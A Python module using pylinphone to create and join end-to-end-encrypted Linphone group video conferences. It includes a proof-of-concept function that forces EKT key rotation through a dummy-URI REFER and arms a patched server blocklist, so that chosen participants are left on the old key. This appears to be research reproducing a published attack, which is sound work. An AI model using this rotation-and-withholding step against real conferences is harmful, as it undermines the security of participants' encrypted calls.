from __future__ import annotations

import logging
import time

import linphone

log = logging.getLogger(__name__)


def join_e2ee_conference(
    core,
    *,
    conference_uri: str,
    streams_running_timeout: float = 60.0,
):
    """Invite into a Linphone Group-Call E2EE conference and wait until media flows.

    Mirrors the test helper `create_simple_end_to_end_encrypted_conference()` in
    liblinphone/tester/local-encrypted-conference-tester.cpp."""
    target = core.interpret_url(conference_uri, True)
    if target is None:
        raise ValueError(f"could not parse conference URI: {conference_uri}")

    call_params = core.create_call_params(None)
    call_params.video_enabled = True
    # Audio MUST be enabled at SDP level even though we're send-only video:
    # sip.linphone.org's videoconference-factory rejects audio-less offers
    # with a local "no audio stream" error (call goes Error/ReasonNone). The
    # mic is muted at Core level, so the audio stream carries silence.
    call_params.audio_enabled = True
    call_params.video_direction = _send_only_video_direction()
    # Don't pin media_encryption on CallParams — let the Core's
    # `media_encryption` (preferred=SRTP, mandatory=False) be inherited so the
    # answer-side can accept both SRTP and ZRTP offers from peers.

    log.info("inviting %s (E2EE group call)", conference_uri)
    # pylinphone signature: invite_address_with_params(addr, params, subject, content)
    call = core.invite_address_with_params(target, call_params, None, None)
    if call is None:
        raise RuntimeError(f"core.invite_address_with_params returned None for {conference_uri}")

    RUNNING = linphone.CallState.CallStateStreamsRunning
    DEAD = {linphone.CallState.CallStateEnd,
            linphone.CallState.CallStateReleased,
            linphone.CallState.CallStateError}

    deadline = time.monotonic() + streams_running_timeout
    while time.monotonic() < deadline:
        core.iterate()
        st = call.state
        if st == RUNNING:
            log.info("conference media is running (call state=StreamsRunning)")
            return call
        if st in DEAD:
            raise RuntimeError(
                f"call ended before media ran (state={st!r}, {_call_error(call)})"
            )
        time.sleep(0.05)
    raise TimeoutError(
        f"call did not reach StreamsRunning within {streams_running_timeout}s "
        f"(last state={call.state!r}, {_call_error(call)})"
    )


def _call_error(call) -> str:
    """Format the SIP-level reason/error info from a failed call."""
    parts = []
    try:
        ei = call.error_info
        if ei is not None:
            parts.append(f"reason={ei.reason!r}")
            parts.append(f"code={ei.protocol_code}")
            if ei.phrase:
                parts.append(f"phrase={ei.phrase!r}")
            if ei.warnings:
                parts.append(f"warnings={ei.warnings!r}")
    except Exception as exc:  # noqa: BLE001
        parts.append(f"error_info-unavailable={exc!r}")
    try:
        parts.append(f"call.reason={call.reason!r}")
    except Exception:
        pass
    return ", ".join(parts) or "no error info"


def create_e2ee_conference(
    core,
    *,
    subject: str,
    participants: list[str],
    security: str = "e2ee",
    created_timeout: float = 30.0,
):
    """Act as organizer: create a new conference at the configured factory and
    invite the given participants.

    `security` ∈ {"none", "ptp", "e2ee"} maps to ConferenceSecurityLevel.

    Returns the (Conference, leg-Call) pair once the conference reaches the
    `Created` state. The leg-Call is the local CallSession associated with
    our own participation in the conference.

    NB: this requires the upstream conference server to have the EktServer
    plugin loaded (for "e2ee") AND its conference_mode set to
    MSConferenceModeRouterFullPacket. A `488 Not Acceptable` SIP answer at
    INVITE-conference time strongly suggests the server is missing that
    plugin/config — in which case sip.linphone.org's public service cannot
    host E2EE conferences and a Belledonne flexisip-conference deployment
    is needed."""
    level = {
        "none": linphone.ConferenceSecurityLevel.ConferenceSecurityLevelNone,
        "ptp":  linphone.ConferenceSecurityLevel.ConferenceSecurityLevelPointToPoint,
        "e2ee": linphone.ConferenceSecurityLevel.ConferenceSecurityLevelEndToEnd,
    }[security]

    # The Account must be set so the conference factory address from its
    # AccountParams is used; without it, liblinphone can't deduce the
    # organizer address ("The organizer address cannot be deduced neither
    # from the op nor from the local participant") and create_conference
    # SEGVs / returns NULL.
    account = core.default_account
    if account is None:
        raise RuntimeError("no default account — register first")

    params = core.create_conference_params(None)
    params.account = account
    params.audio_enabled = True
    params.video_enabled = True
    params.subject = subject
    params.security_level = level
    if hasattr(params, "local_participant_enabled"):
        params.local_participant_enabled = True
    if hasattr(params, "one_participant_conference_enabled"):
        params.one_participant_conference_enabled = True

    # Force "remote server conference" mode: without an explicit factory
    # address on ConferenceParams, liblinphone falls back to "local server
    # conference" — our own Core then tries to host the conference itself,
    # video is rejected ("Video capability is not supported when the device
    # hosting a conference is not a server") and INVITE is sent direct to
    # participants instead of going through the SFU. We pull the factory
    # address out of the Account and pin it on the params explicitly.
    ap = account.params
    factory_addr = None
    for attr in ("audio_video_conference_factory_address", "conference_factory_address"):
        if hasattr(ap, attr):
            v = getattr(ap, attr)
            if v is not None:
                factory_addr = v
                break
    if factory_addr is None:
        raise RuntimeError(
            "Account has no conference factory address. Set --conference-factory-uri "
            "(default: sip:videoconference-factory@sip.linphone.org)."
        )
    params.conference_factory_address = factory_addr
    log.info("conference factory address pinned to %s", factory_addr.as_string())

    log.info(
        "creating conference: subject=%r security_level=%s participants=%s",
        subject, security, participants,
    )
    conf = core.create_conference_with_params(params)
    if conf is None:
        raise RuntimeError(
            "core.create_conference_with_params returned None — the upstream "
            "conference server may not support EktServer/full-packet routing "
            "(488 Not Acceptable expected)."
        )

    # Sending the conference-create INVITE to the focus URI is the job of
    # Conference::inviteParticipants() (linphone_conference_invite_participants
    # in C, called by the tester's dial-out helper at
    # local-conference-tester-functions.cpp:387). Without this call, the
    # client-side Conference stays at Instantiated indefinitely — no INVITE is
    # ever sent to the focus and the state never reaches CreationPending →
    # Created. add_participant() alone is NOT a substitute: it operates on a
    # conference that has already been created on the focus.
    #
    # The participant address list may be empty (the focus is still informed
    # of conference creation; we just have no extra invitees).
    addr_list = []
    for uri in participants:
        a = core.interpret_url(uri, True)
        if a is None:
            raise ValueError(f"invalid invitee URI: {uri}")
        addr_list.append(a)

    call_params = core.create_call_params(None)
    call_params.audio_enabled = True
    call_params.video_enabled = True
    # NB: must be SendRecv at the call-params level even though we are
    # logically send-only. With a=sendonly, the conference focus advertises
    # the same direction to other participants (focus →participant becomes
    # a=sendonly), and Linphone Android 6.x has been observed to decline
    # such video streams entirely (answer with m=video 0 while accepting
    # the opus audio). Using SendRecv keeps the SDP symmetric; the actual
    # send-only-ness is enforced at the Core level by
    # `video_capture_enabled = True, mic_enabled = False`.
    call_params.video_direction = _send_recv_video_direction()

    log.info("sending conference-create INVITE to focus with %d invitee(s)",
             len(addr_list))
    # NB: the underlying C function returns LinphoneStatus (0 on success,
    # non-zero on failure). pylinphone's wrapper does `return ret == 1`, which
    # mis-encodes the success case as False. Don't inspect the return value —
    # rely on the Conference state machine below.
    conf.invite_participants(addr_list, call_params)

    # Wait for the conference to transition to Created. State enum values:
    # Instantiated=0, CreationPending=1, Created=2, CreationFailed=3, ...
    CREATED = linphone.ConferenceState.ConferenceStateCreated \
        if hasattr(linphone.ConferenceState, "ConferenceStateCreated") else 2
    FAILED = linphone.ConferenceState.ConferenceStateCreationFailed \
        if hasattr(linphone.ConferenceState, "ConferenceStateCreationFailed") else 3

    deadline = time.monotonic() + created_timeout
    while time.monotonic() < deadline:
        core.iterate()
        st = conf.state
        if st == CREATED:
            log.info("conference created: %s", _conf_summary(conf))
            return conf
        if st == FAILED:
            raise RuntimeError(
                f"conference creation failed (state={st!r}). The server "
                f"probably rejected E2EE — check for 488 Not Acceptable in "
                f"the SIP trace and consider running your own flexisip-"
                f"conference server with the EktServer plugin."
            )
        time.sleep(0.05)
    raise TimeoutError(
        f"conference did not reach Created within {created_timeout}s "
        f"(last state={conf.state!r})"
    )


def _conf_summary(conf) -> str:
    try:
        addr = conf.conference_address
        addr_s = addr.as_string() if addr is not None else "?"
    except Exception:
        addr_s = "?"
    try:
        nparts = len(list(conf.participant_list)) if hasattr(conf, "participant_list") else "?"
    except Exception:
        nparts = "?"
    return f"address={addr_s}, participants={nparts}"


def trigger_rotation(
    core,
    conf,
    dummy_uri: str,
    arm_file: str | None = None,
) -> None:
    """Force the EKT plugin on the focus to regenerate the conference master
    key (mEkt) and redistribute it via NOTIFY to every participant.

    Mechanism (from server-conference.cpp:3940-3987):
      Client sends REFER → focus's handleRefer() → addParticipant(info) on the
      allowed list → if the URI was not previously in the allowed list,
      notifyAllowedParticipantListChanged() fires → EKT plugin's
      onAllowedParticipantListChanged() runs clearData() + generateSSpi() and
      then sends a NOTIFY to every participant requesting them to re-publish
      their per-sender keys.

    The dummy URI does NOT have to actually answer the call — it just has to
    be a URI that the conference's allowed-address list has not seen before.
    The REFER will fail at the SIP layer, but the side-effect on the focus
    (mCSpi/mSSpi cleared, rotation initiated) persists. Paper §5.1: "Linphone
    lets a participant update its own sending media key" — this is the
    practical realisation in liblinphone 5.5.x.

    Combined with EKT_NOTIFY_BLOCKLIST on the focus side, this gives the
    paper's Phase 1 key-state divergence: the rotation fires, the new key
    reaches every device except the blocklisted ones, and the blocklisted
    devices stay on the old key.

    `arm_file` (Step-2 PoC): path to a sentinel file consumed by the EKT
    plugin patch (EKT_NOTIFY_BLOCKLIST_ARM_FILE). If given, we touch this
    file immediately before sending the REFER, so the focus's hook starts
    suppressing only NOW. The initial EKT distribution that happened when
    the targets first joined is therefore unaffected — the targets all
    hold K_initial. Only the new key generated by this rotation gets
    withheld from the blocklisted devices, matching the paper's Phase 1
    model exactly."""
    if arm_file:
        from pathlib import Path
        log.info("arming EKT_NOTIFY_BLOCKLIST via %s", arm_file)
        Path(arm_file).touch()
    target = core.interpret_url(dummy_uri, True)
    if target is None:
        raise ValueError(f"could not parse rotation-trigger URI: {dummy_uri!r}")
    log.info("triggering EKT rotation by inviting dummy URI %s", dummy_uri)
    ok = conf.add_participant(target)
    log.info("add_participant(dummy=%s) returned %r — REFER sent, focus will "
             "regenerate the EKT", dummy_uri, ok)


def _send_only_video_direction():
    direction = linphone.MediaDirection
    for name in ("MediaDirectionSendOnly", "SendOnly",
                 "MediaDirectionSendRecv", "SendRecv"):
        if hasattr(direction, name):
            return getattr(direction, name)
    raise AttributeError("no usable MediaDirection enum member found")


def _send_recv_video_direction():
    direction = linphone.MediaDirection
    for name in ("MediaDirectionSendRecv", "SendRecv"):
        if hasattr(direction, name):
            return getattr(direction, name)
    raise AttributeError("no MediaDirection.SendRecv member found")
